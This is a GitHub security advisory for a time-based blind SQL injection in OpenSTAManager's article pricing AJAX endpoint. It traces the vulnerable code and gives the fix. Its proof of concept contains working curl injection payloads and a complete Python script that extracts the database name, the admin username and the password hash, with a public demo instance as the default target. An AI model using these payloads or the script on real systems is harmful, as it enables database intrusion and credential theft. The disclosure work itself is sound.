# [H] OpenSTAManager has a Time-Based Blind SQL Injection in Article Pricing Module

## Summary
Severity: High
Advisory: GHSA-p864-fqgv-92q4
CVE: CVE-2026-24416
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-06
Source: https://github.com/advisories/GHSA-p864-fqgv-92q4
Type: github-advisory

## Affected
- Packagist: `devcode-it/openstamanager` — affected >=0

## Details
### Summary

Critical Time-Based Blind SQL Injection vulnerability in the article pricing module of OpenSTAManager v2.9.8 allows authenticated attackers to extract complete database contents including user credentials, customer data, and financial records through time-based Boolean inference attacks.

**Status:** ✅ Confirmed and tested on live instance (v2.9.8) end [demo.osmbusiness.it](https://demo.osmbusiness.it/) (v2.9.7)
**Vulnerable Parameter:** `idarticolo` (GET)
**Affected Endpoint:** `/ajax_complete.php?op=getprezzi`
**Affected Module:** Articoli (Articles/Products)

### Details

OpenSTAManager v2.9.8 contains a critical Time-Based Blind SQL Injection vulnerability in the article pricing completion handler. The application fails to properly sanitize the `idarticolo` parameter before using it in SQL queries, allowing attackers to inject arbitrary SQL commands and extract sensitive data through time-based Boolean inference.

**Vulnerability Chain:**

1. **Entry Point:** `/ajax_complete.php` (Line 27)
   ```php
   $op = get('op');
   $result = AJAX::complete($op);
   ```
   The `op` parameter is retrieved but the vulnerability lies in other parameters.

2. **Distribution:** `/src/AJAX.php::complete()` (Line 189)
   ```php
   $result = self::getCompleteResults($file, $resource);
   ```

3. **Execution:** `/src/AJAX.php::getCompleteResults()` (Line 402)
   ```php
   require $file;
   ```
   Module-specific complete.php files are included.

4. **Vulnerable Parameter:** `/modules/articoli/ajax/complete.php` (Line 26)
   ```php
   $idarticolo = get('idarticolo');
   ```
   The `idarticolo` parameter is retrieved from GET request.

5. **Vulnerable SQL Query:** `/modules/articoli/ajax/complete.php` (Line 70) **PRIMARY VULNERABILITY**
   ```php
   FROM
       `dt_righe_ddt`
       INNER JOIN `dt_ddt` ON `dt_ddt`.`id` = `dt_righe_ddt`.`idddt`
       INNER JOIN `dt_tipiddt` ON `dt_tipiddt`.`id` = `dt_ddt`.`idtipoddt`
   WHERE
       `idarticolo`='.$idarticolo.' AND
       `dt_tipiddt`.`dir`="entrata" AND
       `idanagrafica`='.prepare($idanagrafica).'
   ```
   **Impact:** Direct concatenation of `$idarticolo` without `prepare()`, while `$idanagrafica` is properly sanitized.

**Context - Full Query Structure (Lines 39-74):**

The vulnerable query is part of a UNION query that fetches pricing history from invoices and delivery notes:

```php
$documenti = $dbo->fetchArray('
    SELECT
        `iddocumento` AS id,
        "Fattura" AS tipo,
        "Fatture di vendita" AS modulo,
        (`subtotale`-`sconto`)/`qta` AS costo_unitario,
        ...
    FROM
        `co_righe_documenti`
        INNER JOIN `co_documenti` ON `co_documenti`.`id` = `co_righe_documenti`.`iddocumento`
        INNER JOIN `co_tipidocumento` ON `co_tipidocumento`.`id` = `co_documenti`.`idtipodocumento`
    WHERE
        `idarticolo`='.prepare($idarticolo).' AND ...  # ✓ PROPERLY SANITIZED (Line 54)
UNION
    SELECT
        `idddt` AS id,
        "Ddt" AS tipo,
        ...
    FROM
        `dt_righe_ddt`
        INNER JOIN `dt_ddt` ON `dt_ddt`.`id` = `dt_righe_ddt`.`idddt`
        INNER JOIN `dt_tipiddt` ON `dt_tipiddt`.`id` = `dt_ddt`.`idtipoddt`
    WHERE
        `idarticolo`='.$idarticolo.' AND   # ✗ VULNERABLE - NO prepare() (Line 70)
        `dt_tipiddt`.`dir`="entrata" AND
        `idanagrafica`='.prepare($idanagrafica).'
ORDER BY
    `id` DESC LIMIT 0,5');
```

**Root Cause:** Developer used `prepare()` correctly in the first SELECT (Line 54) but forgot to use it in the second SELECT of the UNION query (Line 70), creating an inconsistent security pattern.

### PoC

**Step 1: Login**
```bash
curl -c /tmp/cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \
  -d 'username=admin&password=admin'
```

**Step 2: Verify Vulnerability (Time-Based SLEEP)**
```bash
# Test with SLEEP(10)
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(10)))a)" \
  > /dev/null
# Result: real 0m10.32s (10.32 seconds)

# Test with SLEEP(3) - should take ~3 seconds
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(3)))a)" \
  > /dev/null
# Result: real 0m3.36s (3.36 seconds)

# Test without SLEEP
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1" \
  > /dev/null
# Result: real 0m0.31s (0.31 seconds)
```
<img width="1123" height="536" alt="image" src="https://github.com/user-attachments/assets/4f5c56d8-db60-44dd-a52c-35314be4b4ed" />

**Step 3: Data Extraction - Database Name**
```bash
# Extract first character of database name
# Test if first char is 'o' (expected: TRUE for 'openstamanager')
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),1,1)=%27o%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)" \
  > /dev/null
# Result: real 0m2.34s (SLEEP executed - condition TRUE)

# Test if first char is 'x' (expected: FALSE)
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),1,1)=%27x%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)" \
  > /dev/null
# Result: real 0m0.31s (SLEEP not executed - condition FALSE)

# Extract second character (expected: 'p')
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),2,1)=%27p%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)" \
  > /dev/null
# Result: real 0m2.34s (SLEEP executed - confirms second char is 'p')

# Extract first 3 characters (expected: 'ope')
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),1,3)=%27ope%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)" \
  > /dev/null
# Result: real 0m2.33s (SLEEP executed - confirms 'ope...')
```

**Step 4: Extract Sensitive Data - Admin Credentials**
```bash
# Extract admin username (test if first 5 chars are 'admin')
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%20SUBSTRING(username,1,5)%20FROM%20zz_users%20WHERE%20id=1)=%27admin%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)" \
  > /dev/null
# Result: real 0m2.33s (SLEEP executed - confirms admin username)

# Extract first character of password hash (expected: '$' for bcrypt)
time curl -s -b /tmp/cookies.txt \
  "http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%20SUBSTRING(password,1,1)%20FROM%20zz_users%20WHERE%20id=1)=%27%24%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)" \
  > /dev/null
# Result: real 0m2.33s (SLEEP executed - confirms bcrypt hash format)
```

**Payload Explanation:**
```
Original payload: 1 AND SUBSTRING(DATABASE(),1,1)='o' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)
URL-encoded: 1%20AND%20SUBSTRING(DATABASE(),1,1)=%27o%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)

Injection breakdown:
1. 1 - Valid article ID
2. AND SUBSTRING(DATABASE(),1,1)='o' - Boolean condition to test
3. AND (SELECT 1 FROM (SELECT(SLEEP(2)))a) - Execute SLEEP(2) if condition is true

SQL Query Result:
WHERE
    `idarticolo`=1
    AND SUBSTRING(DATABASE(),1,1)='o'
    AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)
    AND `dt_tipiddt`.`dir`="entrata"
    AND `idanagrafica`=1
```

**Automated Extraction Script Example:**
```python
import requests
import time
import string
import sys

# Default Configuration
BASE_URL = "https://demo.osmbusiness.it"
USERNAME = "demo"
PASSWORD = "demodemo1"
SLEEP_TIME = 3  # Increased to 3s for stability on remote demo instance

def login(session, base_url, user, pwd):
    """Authenticates to the application and maintains session."""
    login_url = f"{base_url}/index.php?op=login"
    data = {"username": user, "password": pwd}
    
    print(f"[*] Attempting login to: {login_url}...")
    try:
        response = session.post(login_url, data=data, timeout=10)
        # Check if login was successful (usually indicated by presence of logout link or redirect)
        if "logout" in response.text.lower() or response.status_code == 200:
            print("[+] Login successful!")
            return True
        else:
            print("[-] Login failed. Please check credentials.")
            return False
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return False

def extract_data(session, base_url, sql_query, label="Data"):
    """Extracts data character by character until the end of the string is reached."""
    print(f"\n[*] Extracting: {label}...")
    result = ""
    position = 1
    target_endpoint = f"{base_url}/ajax_complete.php"
    
    # Charset optimized for database names and bcrypt hashes ($, ., /)
    charset = string.ascii_letters + string.digits + "$./" + string.punctuation

    while True:
        found_char = False
        for char in charset:
            # Payload: If the condition is true, the server sleeps for SLEEP_TIME
            # Using ORD() and SUBSTRING() to handle various character types safely
            payload = f"1 AND (SELECT 1 FROM (SELECT IF(ORD(SUBSTRING(({sql_query}),{position},1))={ord(char)},SLEEP({SLEEP_TIME}),0))a)"
            
            params = {
                "op": "getprezzi",
                "idanagrafica": "1",
                "idarticolo": payload
            }

            try:
                start_time = time.time()
                session.get(target_endpoint, params=params, timeout=SLEEP_TIME + 10)
                elapsed = time.time() - start_time

                if elapsed >= SLEEP_TIME:
                    result += char
                    found_char = True
                    sys.stdout.write(f"\r[+] {label} [{position}]: {result}")
                    sys.stdout.flush()
                    break
            except requests.exceptions.RequestException:
                # Handle network jitter/timeouts by retrying or continuing
                continue

        # If no character from charset triggered a sleep, we've reached the end of the data
        if not found_char:
            print(f"\n[!] End of string or no data found at position {position}.")
            break
            
        position += 1
        
    return result

def main():
    s = requests.Session()
    
    # Allow target URL to be passed as a command line argument
    target = sys.argv[1] if len(sys.argv) > 1 else BASE_URL
    
    if login(s, target, USERNAME, PASSWORD):
        # 1. Database name extraction
        db = extract_data(s, target, "SELECT DATABASE()", "Database Name")
        
        # 2. Admin username extraction
        user = extract_data(s, target, "SELECT username FROM zz_users WHERE id=1", "Admin Username (id=1)")
        
        # 3. Password hash extraction (Bcrypt hashes are ~60 chars; the loop handles this automatically)
        pwd_hash = extract_data(s, target, "SELECT password FROM zz_users WHERE id=1", "Password Hash")

        print(f"\n\n{'='*35}")
        print(f"         FINAL REPORT")
        print(f"{'='*35}")
        print(f"Target URL: {target}")
        print(f"Database:   {db}")
        print(f"Username:   {user}")
        print(f"Hash:       {pwd_hash}")
        print(f"{'='*35}")

if __name__ == "__main__":
    main()
```
<img width="674" height="476" alt="image" src="https://github.com/user-attachments/assets/24173485-55a0-4224-9746-48786704bb73" />

### Impact


**Affected Users:** All authenticated users with access to the article pricing functionality (typically users managing quotes, invoices, orders).

**Recommended Fix:**

**File:** `/modules/articoli/ajax/complete.php`

**BEFORE (Vulnerable - Line 70):**
```php
WHERE
    `idarticolo`='.$idarticolo.' AND
    `dt_tipiddt`.`dir`="entrata" AND
    `idanagrafica`='.prepare($idanagrafica).'
```

**AFTER (Fixed):**
```php
WHERE
    `idarticolo`='.prepare($idarticolo).' AND
    `dt_tipiddt`.`dir`="entrata" AND
    `idanagrafica`='.prepare($idanagrafica).'
```

### Credits
Discovered by Łukasz Rybak

## References
- https://github.com/devcode-it/openstamanager/security/advisories/GHSA-p864-fqgv-92q4
- https://nvd.nist.gov/vuln/detail/CVE-2026-24416
- https://github.com/devcode-it/openstamanager
